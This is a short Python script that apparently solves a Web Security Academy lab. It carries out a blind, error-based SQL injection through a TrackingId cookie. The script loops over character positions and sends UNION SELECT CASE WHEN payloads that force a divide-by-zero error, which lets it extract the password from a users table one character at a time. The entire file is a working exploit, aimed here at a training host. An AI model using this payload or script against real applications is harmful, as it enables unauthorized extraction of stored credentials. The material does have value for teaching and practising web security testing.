import requests

z=0
sym1=["A","a","B","b","c","C","d","D","e","E","f","F","g","G","h","H","i","I","k","K","l","L","m","M","n","N","o","O","p","P","q","Q","r","R","s","S","t","T","v","V","x","X","y","Y","z","Z","1","2","3","4","5","6","7","8","9","0"]
flag = ""

if __name__ == "__main__":
    while (z < 21):
        for char in sym1:
            url="https://ac2d1fc31f0a65658089707200f600ac.web-security-academy.net/"
            cookies = {"TrackingId":"a'+UNION+SELECT+CASE+WHEN+(substr(password,"+ str(z) +",1)='"+ char +"')+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--","session":"dP7ZfsyflsHQ1XgU5A9zL0HkPpbC0X6L"}
            res = requests.get(url,cookies=cookies)
            if res.status_code != 200:
                flag += char
                print(flag)
                break
        z+=1 
